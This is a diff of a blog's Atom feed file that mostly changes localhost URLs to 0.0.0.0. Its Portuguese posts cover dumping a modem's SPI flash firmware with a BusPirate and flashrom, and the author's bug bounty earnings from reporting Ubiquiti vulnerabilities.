-Maycon Vitali&lt;/p&gt;</content><author><name>Maycon Vitali</name></author><category term="hello" /><summary type="html">Hi guys. I am writing this first post to tell you I’m back to share some technical stuff and, for this reason, I am remaking both my personal site and the Hack N’ Roll one. Once the new layout is done (maybe the same of this site, because I’m not good with HTML+CSS), I will migrate the posts from the old site to the new one.</summary></entry><entry xml:lang="br"><title type="html">Embedded Hacking: Extração de Firmware usando SPI</title><link href="http://localhost:4000/embedded-hacking/2018/01/25/iot-hacking-extracao-de-firmware-usando-spi.html" rel="alternate" type="text/html" title="Embedded Hacking: Extração de Firmware usando SPI" /><published>2018-01-25T22:00:00-02:00</published><updated>2018-01-25T22:00:00-02:00</updated><id>http://localhost:4000/embedded-hacking/2018/01/25/iot-hacking-extracao-de-firmware-usando-spi</id><content type="html" xml:base="http://localhost:4000/embedded-hacking/2018/01/25/iot-hacking-extracao-de-firmware-usando-spi.html">&lt;p&gt;O objetivo desse post é dar inicio a uma série de publicações sobre hacking de embedded devices. Apesar de eu não ser nenhum mestre nisso, acredito que já tenha feito experimentos o suficiente para ajudar aos iniciantes que tiveram pouco ou nenhum contato com hacking de dispositivos embarcados. E, como de praxe, uma das primeiras partes geralmente envolve a obtenção do firmware do dispositivo. E é sobre isso que iremos falar nesse post. Caso identifiquem algum erro basta entrar em contato comigo pelos comentários no final do post ou por qualquer um dos contatos disponíveis na barra lateral do site.&lt;/p&gt;
+Maycon Vitali&lt;/p&gt;</content><author><name>Maycon Vitali</name></author><category term="hello-world" /><category term="hello" /><summary type="html">Hi guys. I am writing this first post to tell you I’m back to share some technical stuff and, for this reason, I am remaking both my personal site and the Hack N’ Roll one. Once the new layout is done (maybe the same of this site, because I’m not good with HTML+CSS), I will migrate the posts from the old site to the new one.</summary></entry><entry xml:lang="br"><title type="html">Embedded Hacking: Extração de Firmware usando SPI</title><link href="http://0.0.0.0:4000/embedded-hacking/2018/01/25/iot-hacking-extracao-de-firmware-usando-spi.html" rel="alternate" type="text/html" title="Embedded Hacking: Extração de Firmware usando SPI" /><published>2018-01-25T22:00:00-02:00</published><updated>2018-01-25T22:00:00-02:00</updated><id>http://0.0.0.0:4000/embedded-hacking/2018/01/25/iot-hacking-extracao-de-firmware-usando-spi</id><content type="html" xml:base="http://0.0.0.0:4000/embedded-hacking/2018/01/25/iot-hacking-extracao-de-firmware-usando-spi.html">&lt;p&gt;O objetivo desse post é dar inicio a uma série de publicações sobre hacking de embedded devices. Apesar de eu não ser nenhum mestre nisso, acredito que já tenha feito experimentos o suficiente para ajudar aos iniciantes que tiveram pouco ou nenhum contato com hacking de dispositivos embarcados. E, como de praxe, uma das primeiras partes geralmente envolve a obtenção do firmware do dispositivo. E é sobre isso que iremos falar nesse post. Caso identifiquem algum erro basta entrar em contato comigo pelos comentários no final do post ou por qualquer um dos contatos disponíveis na barra lateral do site.&lt;/p&gt;
 
 &lt;h2 id=&quot;o-que-é-um-firmware&quot;&gt;O que é um firmware?&lt;/h2&gt;
 
@@ -882,21 +882,21 @@ Maycon Vitali&lt;/p&gt;</content><author><name>Maycon Vitali</name></author><cat
 
 &lt;p&gt;Então! Temos nosso modem em mãos:&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/images/posts/2018/01/modem.png&quot; alt=&quot;Modem MITRASTAR DSL-100HN-T1-NV (VIVO)&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://0.0.0.0:4000/assets/images/posts/2018/01/modem.png&quot; alt=&quot;Modem MITRASTAR DSL-100HN-T1-NV (VIVO)&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;A primeira coisa a fazer é abrir o modem e acessar sua placa de circuito. Nesse modelo o procedimento é bem simples, bastando desparafusar 4 parafusos na parte de baixo do modem e desencaixar com cuidado as duas partes de plástico, a de cima e a de baixo. Com isso temos acesso à placa do modem:&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/images/posts/2018/01/MITRASTAR-board.png&quot; alt=&quot;Placa interna&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://0.0.0.0:4000/assets/images/posts/2018/01/MITRASTAR-board.png&quot; alt=&quot;Placa interna&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;Para identificar a memória flash que ele utiliza temos que começar procurando por chips que possuem 4 ou 8 pinos. Analisando esses chips com uma lupa (pra quem é ruim das vistas) e uma boa iluminação, é possível identificar o que tem escrito em cada um deles e, então, perguntar ao google mais detalhes sobre o que ele é.&lt;/p&gt;
 
 &lt;p&gt;Procurando sobre cada possível candidato à memória flash visível na placa, foi possível identificar a MX25L12835F da Macronix, com capacidade de 16MB.&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/images/posts/2018/01/MX25L12835F-chip.png&quot; alt=&quot;Memória Flash MX25L12835F&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://0.0.0.0:4000/assets/images/posts/2018/01/MX25L12835F-chip.png&quot; alt=&quot;Memória Flash MX25L12835F&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;Tendo o modelo da memória flash, sem muita dificuldade foi possível achar a especificação(&lt;a href=&quot;http://datasheet.octopart.com/MX25L12835FZ2I-10G-Macronix-datasheet-14372549.pdf&quot;&gt;datasheet&lt;/a&gt;) da mesma. Essa documentação contém todas as informações referentes ao chip, inclusive sua pinagem, que é o que mais nos interessa:&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/images/posts/2018/01/MX25L12835F-pinout.png&quot; alt=&quot;Pinagem da Flash MX25L12835F&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://0.0.0.0:4000/assets/images/posts/2018/01/MX25L12835F-pinout.png&quot; alt=&quot;Pinagem da Flash MX25L12835F&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;Vamos ver o que temos no nosso chip e como iremos conecta-lo:&lt;/p&gt;
 &lt;ul&gt;
@@ -935,7 +935,7 @@ Maycon Vitali&lt;/p&gt;</content><author><name>Maycon Vitali</name></author><cat
 
 &lt;p&gt;Como já identificamos as pinagens responsáveis pelo SPI, então agora, com o aparelho desligado, temos tudo para conectar o BusPirate diretamente na memória flash. Eu utilizei umas pinças de testes que possuo, mas o mesmo pode ser feito utilizando uma pinça SOIC8:&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/images/posts/2018/01/buspirate-connected.png&quot; alt=&quot;BusPirate conectado na memória Flash&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://0.0.0.0:4000/assets/images/posts/2018/01/buspirate-connected.png&quot; alt=&quot;BusPirate conectado na memória Flash&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;Tendo tudo conectado, ligamos o BusPirate no computador e utilizamos o aplicativo &lt;em&gt;flashrom&lt;/em&gt; para testar a comunicação com a memória flash:&lt;/p&gt;
 
@@ -952,9 +952,9 @@ Please specify which chip definition to use with the &lt;span class=&quot;nt&quo
 
 &lt;p&gt;Como é possível notar, o flashrom identificou nossa memória flash MX25L12835F com o identificador “MX25L12835F/MX25L12845E/MX25L12865E”.&lt;/p&gt;
 
-&lt;p&gt;Apesar de ter utilizado o device &lt;code class=&quot;highlighter-rouge&quot;&gt;/dev/buspirate&lt;/code&gt;, esse device só existe por uma regra que adicionei no udev do meu sistema operacional. Caso esse device não existe no seu sistema, tente os padrões &lt;code class=&quot;highlighter-rouge&quot;&gt;/dev/ttyUSB0&lt;/code&gt; ou similar. Em caso de dúvidas conecte o BUsPirate na USB da máquina e utilize o comando &lt;code class=&quot;highlighter-rouge&quot;&gt;dmesg&lt;/code&gt; para identificar se ele foi detectado corretamente e qual dispositivo está sendo associado à ele.&lt;/p&gt;
+&lt;p&gt;Apesar de ter utilizado o device &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/dev/buspirate&lt;/code&gt;, esse device só existe por uma regra que adicionei no udev do meu sistema operacional. Caso esse device não existe no seu sistema, tente os padrões &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/dev/ttyUSB0&lt;/code&gt; ou similar. Em caso de dúvidas conecte o BUsPirate na USB da máquina e utilize o comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dmesg&lt;/code&gt; para identificar se ele foi detectado corretamente e qual dispositivo está sendo associado à ele.&lt;/p&gt;
 
-&lt;p&gt;Tendo identificado o dispositivo, agora basta utilizar o &lt;code class=&quot;highlighter-rouge&quot;&gt;flashrom&lt;/code&gt; para extrair o conteúdo da memória flash para um arquivo:&lt;/p&gt;
+&lt;p&gt;Tendo identificado o dispositivo, agora basta utilizar o &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;flashrom&lt;/code&gt; para extrair o conteúdo da memória flash para um arquivo:&lt;/p&gt;
 
 &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;maycon@DayOfDevil ~]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;time &lt;/span&gt;flashrom &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; buspirate_spi:dev&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/dev/buspirate,spispeed&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1M &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;MX25L12835F/MX25L12845E/MX25L12865E&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; flash.dump
 flashrom v0.9.9-r1955 on Linux 4.14.7-1-ARCH &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;x86_64&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
@@ -993,11 +993,11 @@ Maycon Vitali&lt;/p&gt;
 
 &lt;h2 id=&quot;bônus-oh-really&quot;&gt;Bônus: Oh Really?!?!&lt;/h2&gt;
 
-&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/images/posts/2018/01/bonus-really.png&quot; alt=&quot;BusPirate conectado na memória Flash&quot; /&gt;&lt;/p&gt;</content><author><name>Maycon Vitali</name></author><category term="embedded-devices" /><category term="hacking-embedded" /><category term="IoT-hacking" /><summary type="html">O objetivo desse post é dar inicio a uma série de publicações sobre hacking de embedded devices. Apesar de eu não ser nenhum mestre nisso, acredito que já tenha feito experimentos o suficiente para ajudar aos iniciantes que tiveram pouco ou nenhum contato com hacking de dispositivos embarcados. E, como de praxe, uma das primeiras partes geralmente envolve a obtenção do firmware do dispositivo. E é sobre isso que iremos falar nesse post. Caso identifiquem algum erro basta entrar em contato comigo pelos comentários no final do post ou por qualquer um dos contatos disponíveis na barra lateral do site.</summary></entry><entry xml:lang="br"><title type="html">Talk is cheap. Show me the money!</title><link href="http://localhost:4000/bug-bounty/2018/01/21/talk-is-cheap-show-me-the-money.html" rel="alternate" type="text/html" title="Talk is cheap. Show me the money!" /><published>2018-01-21T22:00:00-02:00</published><updated>2018-01-21T22:00:00-02:00</updated><id>http://localhost:4000/bug-bounty/2018/01/21/talk-is-cheap-show-me-the-money</id><content type="html" xml:base="http://localhost:4000/bug-bounty/2018/01/21/talk-is-cheap-show-me-the-money.html">&lt;p&gt;Esta primeira publicação tem como objetivo principal estimular e incentivar a participação de profissionais de segurança, hackers e entusiastas nos tão famigerados programas de recompensa por falhas; os chamados Bug Bounty Programs. Aqui não terá nada muito técnico, mas isso já está no TODO-List para publicações futuras.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://0.0.0.0:4000/assets/images/posts/2018/01/bonus-really.png&quot; alt=&quot;BusPirate conectado na memória Flash&quot; /&gt;&lt;/p&gt;</content><author><name>Maycon Vitali</name></author><category term="embedded-hacking" /><category term="embedded-devices" /><category term="hacking-embedded" /><category term="IoT-hacking" /><summary type="html">O objetivo desse post é dar inicio a uma série de publicações sobre hacking de embedded devices. Apesar de eu não ser nenhum mestre nisso, acredito que já tenha feito experimentos o suficiente para ajudar aos iniciantes que tiveram pouco ou nenhum contato com hacking de dispositivos embarcados. E, como de praxe, uma das primeiras partes geralmente envolve a obtenção do firmware do dispositivo. E é sobre isso que iremos falar nesse post. Caso identifiquem algum erro basta entrar em contato comigo pelos comentários no final do post ou por qualquer um dos contatos disponíveis na barra lateral do site.</summary></entry><entry xml:lang="br"><title type="html">Talk is cheap. Show me the money!</title><link href="http://0.0.0.0:4000/bug-bounty/2018/01/21/talk-is-cheap-show-me-the-money.html" rel="alternate" type="text/html" title="Talk is cheap. Show me the money!" /><published>2018-01-21T22:00:00-02:00</published><updated>2018-01-21T22:00:00-02:00</updated><id>http://0.0.0.0:4000/bug-bounty/2018/01/21/talk-is-cheap-show-me-the-money</id><content type="html" xml:base="http://0.0.0.0:4000/bug-bounty/2018/01/21/talk-is-cheap-show-me-the-money.html">&lt;p&gt;Esta primeira publicação tem como objetivo principal estimular e incentivar a participação de profissionais de segurança, hackers e entusiastas nos tão famigerados programas de recompensa por falhas; os chamados Bug Bounty Programs. Aqui não terá nada muito técnico, mas isso já está no TODO-List para publicações futuras.&lt;/p&gt;
 
 &lt;h3 id=&quot;o-que-é-bug-bounty&quot;&gt;O que é Bug Bounty?&lt;/h3&gt;
 
-&lt;p&gt;Pra quem não sabe o que é um &lt;code class=&quot;highlighter-rouge&quot;&gt;Bug Bounty&lt;/code&gt; Program, uma forma simples de explicar é que são projetos que te recompensam por descobrir vulnerabilidades e reportar de maneira &lt;strong&gt;ética&lt;/strong&gt; para o desenvolvedor/vendor do produto ou para quem usa o mesmo. Essas recompensas podem ser o conhecimento da descoberta, muitas vezes com nome e contato profissional divulgado no hall da fama; porém a recompensa também podem ser monetária; e é aí que tudo começa a ficar mais interessante.&lt;/p&gt;
+&lt;p&gt;Pra quem não sabe o que é um &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Bug Bounty&lt;/code&gt; Program, uma forma simples de explicar é que são projetos que te recompensam por descobrir vulnerabilidades e reportar de maneira &lt;strong&gt;ética&lt;/strong&gt; para o desenvolvedor/vendor do produto ou para quem usa o mesmo. Essas recompensas podem ser o conhecimento da descoberta, muitas vezes com nome e contato profissional divulgado no hall da fama; porém a recompensa também podem ser monetária; e é aí que tudo começa a ficar mais interessante.&lt;/p&gt;
 
 &lt;p&gt;Existem diversas empresas que possuem seu programa de recompensa para falhas como o &lt;a href=&quot;https://pt-br.facebook.com/BugBounty/&quot;&gt;Facebook&lt;/a&gt;, &lt;a href=&quot;https://www.google.com/about/appsecurity/reward-program/&quot;&gt;Google&lt;/a&gt; ou &lt;a href=&quot;https://technet.microsoft.com/pt-br/library/dn425036.aspx&quot;&gt;Microsoft&lt;/a&gt;. Além do mais, existem plataformas que concentram dezenas de centenas de empresas diferentes, atuando como um intermediador, com é o caso do &lt;a href=&quot;https://www.hackerone.com/&quot;&gt;HackerOne&lt;/a&gt;, e outras empresas que aderem a programas de recompensa porém com o intuito de revender as falhas para outros órgãos (aka governos) ou adicionar a algum produto específico de segurança.&lt;/p&gt;
 
@@ -1023,7 +1023,7 @@ Maycon Vitali&lt;/p&gt;
 
 &lt;p&gt;O próximo passo foi identificar o alvo e, depois de alguma pesquisa e de conversar com alguns conhecidos, cheguei na conclusão de comprar um &lt;a href=&quot;https://produto.mercadolivre.com.br/MLB-811540935-ubiquiti-edgerouter-x-er-x-5-portas-rj45-_JM?source=gps&quot;&gt;EdgeRouter X no MercadoLivre&lt;/a&gt;, um roteador gerenciável e com algumas funcionalidades bem interessantes. A compra (com frete) me fez desembolsar em torno de R$ 300,00. Mas eu sei que seria para um bem maior, e se achasse um simples XSS, já ganharia em torno de U$ 150,00, que seria suficiente para recuperar o valor investido (além de um pequeno lucro).&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/images/posts/2018/01/edgerouter-ml.png&quot; alt=&quot;EdgeRouter X no MercadoLivre&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://0.0.0.0:4000/assets/images/posts/2018/01/edgerouter-ml.png&quot; alt=&quot;EdgeRouter X no MercadoLivre&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;Fiz a compra na quinta-feira, dia 30 de maio, e o router foi entregue quase duas semanas depois, no dia 14 de junho, véspera do feriado de 15 de junho (Corpus Christi).&lt;/p&gt;
 
@@ -1061,7 +1061,7 @@ Maycon Vitali&lt;/p&gt;
 
 &lt;p&gt;Já me dei por satisfeito, ficando contente com os possíveis U$ 250,00 que estariam por vir. Até que eu vi o seguinte e-mail, que simplesmente dizia que eu já havia sido pago. Isso mesmo! Em menos de 12 horas a vulnerabilidade que eu identifiquei foi confirmada e a recompensa foi paga. Além do mais, ao invés dos U$ 250,00 que eu esperava, eu fui &lt;strong&gt;recompensado em U$ 1.500,00&lt;/strong&gt;, que além de pagar o investimento no EdgeRouter que eu havia comprado, daria para comprar mais 15 modelos iguais.&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/images/posts/2018/01/ubnt-primeiro-report.png&quot; alt=&quot;Primeiro relatório de vulnerabilidade&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://0.0.0.0:4000/assets/images/posts/2018/01/ubnt-primeiro-report.png&quot; alt=&quot;Primeiro relatório de vulnerabilidade&quot; /&gt;&lt;/p&gt;
 
 &lt;h3 id=&quot;money-money-e-um-convite-inusitado&quot;&gt;Money, money e um convite inusitado(?)&lt;/h3&gt;
 
@@ -1069,7 +1069,7 @@ Maycon Vitali&lt;/p&gt;
 
 &lt;p&gt;Como eu peguei gosto pela coisa, mas não tinha muito tempo disponível fora dos finais de semana, decidi me acalmar um pouco e só olhar um pouco durante os finais de semana. Porém no dia 15 de junho eu recebi uma mensagem privada da Ubiquiti me convidando para testar um equipamento do Beta Store, o &lt;a href=&quot;https://store.ubnt.com/products/ethermagic&quot;&gt;EtherMagic&lt;/a&gt;, e caso eu aceitasse, eles me enviariam um kit &lt;strong&gt;gratuito&lt;/strong&gt;. Isso fez com que eu percebesse o reconhecimento da empresa frente às minhas pesquisas de vulnerabilidade dos equipamentos deles.&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/images/posts/2018/01/invite-beta-test.png&quot; alt=&quot;Convite recebido&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://0.0.0.0:4000/assets/images/posts/2018/01/invite-beta-test.png&quot; alt=&quot;Convite recebido&quot; /&gt;&lt;/p&gt;
 
 &lt;h3 id=&quot;não-deixa-o-samba-morrer&quot;&gt;Não deixa o samba morrer…&lt;/h3&gt;
 
@@ -1081,7 +1081,7 @@ Maycon Vitali&lt;/p&gt;
 
 &lt;p&gt;Depois de duas semanas que o aparelho novo foi postado, ele finalmente chegou nas minhas mãos. No começo fiquei um pouco preocupado de já abrir ele e sair soldando pinagem para UART (falarei sobre isso em publicações futuras) e acabar estragando, afinal de contas, se estragasse eu não poderia simplesmente abrir uma loja virtual e comprar outro. Mas infelizmente como o aparelho é beta, o suporte dele é bem limitado (pode-se dizer até que é inexistente), inclusive não existe uma versão do firmware dele na página de download do vendor. Ou seja, eu deveria extrair o firmware diretamente do device (também falarei disso em uma publicação futura) para conseguir acesso nele e fazer análise das aplicações em execução.&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/images/posts/2018/01/ethermagic.png&quot; alt=&quot;EtherMagic&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://0.0.0.0:4000/assets/images/posts/2018/01/ethermagic.png&quot; alt=&quot;EtherMagic&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;Já era tarde da noite e eu estava razoavelmente cansado de tentar acesso ao aparelho. Porém eu, com meu conhecimento em hardware tendendo a zero, comecei a brincar com os comandos do bootloader dele (o U-Boot) e, de uma forma quase que milagrosa, consegui cagar com a memória FLASH do aparelho. #gênio&lt;/p&gt;
 
@@ -1099,11 +1099,11 @@ Maycon Vitali&lt;/p&gt;
 
 &lt;p&gt;Um resumo desse mês brincando com Bug Bounties foram 10 falhas reportadas, sendo uma delas duplicada e 9 falhas com rendimento total de U$ 19.800.00, o que é grana pra c@%$#$:&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/images/posts/2018/01/h1-extrato.png&quot; alt=&quot;Extrato do HackerOne&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://0.0.0.0:4000/assets/images/posts/2018/01/h1-extrato.png&quot; alt=&quot;Extrato do HackerOne&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;Também como resultado disso, eu fechei 2017 na quinta posição do ranking de agradecimento da Ubiquiti Networks:&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/images/posts/2018/01/ubnt-thanks.png&quot; alt=&quot;Ranking da Ubiquiti em 2017&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://0.0.0.0:4000/assets/images/posts/2018/01/ubnt-thanks.png&quot; alt=&quot;Ranking da Ubiquiti em 2017&quot; /&gt;&lt;/p&gt;
 
 &lt;h3 id=&quot;conclusão&quot;&gt;Conclusão&lt;/h3&gt;
 
@@ -1112,4 +1112,4 @@ Maycon Vitali&lt;/p&gt;
 &lt;p&gt;Boa caçada!&lt;/p&gt;
 
 &lt;p&gt;Maycon Vitali&lt;br /&gt;
-Hack N’ Roll&lt;/p&gt;</content><author><name>Maycon Vitali</name></author><category term="bug-bounty" /><category term="hackerone" /><category term="ubiquiti" /><summary type="html">Esta primeira publicação tem como objetivo principal estimular e incentivar a participação de profissionais de segurança, hackers e entusiastas nos tão famigerados programas de recompensa por falhas; os chamados Bug Bounty Programs. Aqui não terá nada muito técnico, mas isso já está no TODO-List para publicações futuras.</summary></entry></feed>
+Hack N’ Roll&lt;/p&gt;</content><author><name>Maycon Vitali</name></author><category term="bug-bounty" /><category term="bug-bounty" /><category term="hackerone" /><category term="ubiquiti" /><summary type="html">Esta primeira publicação tem como objetivo principal estimular e incentivar a participação de profissionais de segurança, hackers e entusiastas nos tão famigerados programas de recompensa por falhas; os chamados Bug Bounty Programs. Aqui não terá nada muito técnico, mas isso já está no TODO-List para publicações futuras.</summary></entry></feed>
